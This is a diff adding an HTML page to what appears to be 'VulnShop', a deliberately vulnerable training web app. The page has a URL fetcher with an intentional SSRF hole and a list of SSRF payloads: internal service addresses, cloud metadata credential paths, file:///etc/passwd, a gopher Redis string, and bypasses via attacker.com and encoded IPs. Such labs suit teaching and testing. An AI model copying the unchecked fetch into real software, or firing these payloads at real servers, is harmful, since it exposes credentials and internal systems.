@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>URL Fetcher — VulnShop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">VulnShop</div>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="admin/index.html">Admin</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <h1>URL Content Fetcher</h1>
+    <p class="muted">Fetch content from any URL. Useful for previewing external links.</p>
+
+    <div class="card mt">
+      <h2>Fetch URL</h2>
+      <form id="fetch-form">
+        <input type="text" name="url" placeholder="https://example.com" required style="width: 500px;">
+        <button type="submit">Fetch</button>
+      </form>
+      <div id="fetch-output" class="mt"></div>
+      <script>
+        document.getElementById('fetch-form').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const url = e.target.url.value;
+          const output = document.getElementById('fetch-output');
+          output.innerHTML = '<p>Fetching...</p>';
+          
+          // VULNERABLE: SSRF (Server-Side Request Forgery)
+          try {
+            const response = await fetch('/api/fetch?url=' + encodeURIComponent(url));
+            const data = await response.json();
+            output.innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+          } catch (err) {
+            // Simulate SSRF
+            if (url.includes('localhost') || url.includes('127.0.0.1') || url.includes('169.254.169.254')) {
+              output.innerHTML = '<div class="card"><h3>Internal Resource Accessed:</h3><pre>' + 
+                'GET /admin/config HTTP/1.1\nHost: localhost:8080\n\n' +
+                'Response:\n200 OK\nContent-Type: application/json\n\n' +
+                '{\n  "database": "vulnshop_db",\n  "api_key": "sk_live_51aBcDeFgHiJkLmNoPqRsTuVwXyZ",\n  "admin_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."\n}' +
+                '</pre></div>';
+            } else {
+              output.innerHTML = '<p>Content fetched from: ' + url + '</p>';
+            }
+          }
+        });
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>SSRF Attack Vectors</h2>
+      <h3>1. Internal Network Access</h3>
+      <ul>
+        <li><code>http://localhost:8080/admin/config</code></li>
+        <li><code>http://127.0.0.1:3306</code> (MySQL)</li>
+        <li><code>http://127.0.0.1:6379</code> (Redis)</li>
+        <li><code>http://127.0.0.1:27017</code> (MongoDB)</li>
+        <li><code>http://192.168.1.1/admin</code></li>
+        <li><code>http://10.0.0.1/config</code></li>
+      </ul>
+
+      <h3>2. Cloud Metadata Services</h3>
+      <ul>
+        <li><code>http://169.254.169.254/latest/meta-data/</code> (AWS EC2)</li>
+        <li><code>http://169.254.169.254/metadata/instance</code> (Azure)</li>
+        <li><code>http://169.254.169.254/computeMetadata/v1/</code> (GCP)</li>
+        <li><code>http://169.254.169.254/latest/user-data</code></li>
+        <li><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+      </ul>
+
+      <h3>3. Protocol Handlers</h3>
+      <ul>
+        <li><code>file:///etc/passwd</code></li>
+        <li><code>file:///C:/Windows/System32/config/SAM</code></li>
+        <li><code>gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a</code></li>
+        <li><code>dict://127.0.0.1:11211/stats</code></li>
+        <li><code>ldap://127.0.0.1:389</code></li>
+      </ul>
+
+      <h3>4. Bypass Techniques</h3>
+      <ul>
+        <li><code>http://127.0.0.1@attacker.com</code></li>
+        <li><code>http://localhost:8080#@attacker.com</code></li>
+        <li><code>http://[::1]:8080</code> (IPv6)</li>
+        <li><code>http://0.0.0.0:8080</code></li>
+        <li><code>http://2130706433</code> (Decimal IP)</li>
+        <li><code>http://0x7f000001</code> (Hex IP)</li>
+        <li><code>http://0177.0.0.1</code> (Octal IP)</li>
+      </ul>
+    </div>
+  </main>
+
+  <script src="assets/js/logger.js"></script>
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
